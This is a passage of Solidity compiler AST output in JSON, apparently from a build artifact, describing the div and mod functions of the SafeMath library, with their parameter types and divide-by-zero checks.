												"src": "3961:8:1"
											}
										]
									},
									"documentation": {
										"id": 343,
										"nodeType": "StructuredDocumentation",
										"src": "3169:464:1",
										"text": " @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n division by zero. The result is rounded towards zero.\n Counterpart to Solidity's `/` operator. Note: this function uses a\n `revert` opcode (which leaves remaining gas untouched) while Solidity\n uses an invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 370,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 350,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 345,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 370,
												"src": "3651:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 344,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3651:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 347,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 370,
												"src": "3662:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 346,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3662:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 349,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 370,
												"src": "3673:26:1",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 348,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "3673:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3650:50:1"
									},
									"returnParameters": {
										"id": 353,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 352,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 370,
												"src": "3724:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 351,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3724:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3723:9:1"
									},
									"scope": 412,
									"src": "3638:338:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 386,
										"nodeType": "Block",
										"src": "4487:61:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 381,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 373,
															"src": "4508:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 382,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 375,
															"src": "4511:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d6f64756c6f206279207a65726f",
															"id": 383,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4514:26:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															},
															"value": "SafeMath: modulo by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															}
														],
														"id": 380,
														"name": "mod",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															387,
															411
														],
														"referencedDeclaration": 411,
														"src": "4504:3:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$_t_string_memory_ptr_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256,string memory) pure returns (uint256)"
														}
													},
													"id": 384,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4504:37:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 379,
												"id": 385,
												"nodeType": "Return",
												"src": "4497:44:1"
											}
										]
									},
									"documentation": {
										"id": 371,
										"nodeType": "StructuredDocumentation",
										"src": "3982:433:1",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n Reverts when dividing by zero.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 387,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 376,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 373,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 387,
												"src": "4433:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 372,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4433:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 375,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 387,
												"src": "4444:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 374,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4444:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4432:22:1"
									},
									"returnParameters": {
										"id": 379,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 378,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 387,
												"src": "4478:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 377,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4478:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4477:9:1"
									},
									"scope": 412,
									"src": "4420:128:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 410,
										"nodeType": "Block",
										"src": "5107:68:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 402,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 400,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 392,
																"src": "5125:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 401,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "5130:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "5125:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 403,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 394,
															"src": "5133:12:1",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 399,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "5117:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 404,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5117:29:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 405,
												"nodeType": "ExpressionStatement",
												"src": "5117:29:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 408,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 406,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 390,
														"src": "5163:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 407,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 392,
														"src": "5167:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5163:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 398,
												"id": 409,
												"nodeType": "Return",
												"src": "5156:12:1"
											}
										]
									},
									"documentation": {
										"id": 388,
										"nodeType": "StructuredDocumentation",
										"src": "4554:453:1",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n Reverts with custom message when dividing by zero.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 411,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 395,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 390,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 411,
												"src": "5025:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 389,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5025:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 392,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 411,
												"src": "5036:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 391,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5036:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 394,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 411,
												"src": "5047:26:1",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 393,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5047:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5024:50:1"
									},
									"returnParameters": {
										"id": 398,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 397,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 411,
												"src": "5098:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 396,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5098:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5097:9:1"
									},
									"scope": 412,
									"src": "5012:163:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 413,
							"src": "589:4588:1"
						}
					],
					"src": "0:5178:1"
				},
				"id": 1
			}
		}
	}
}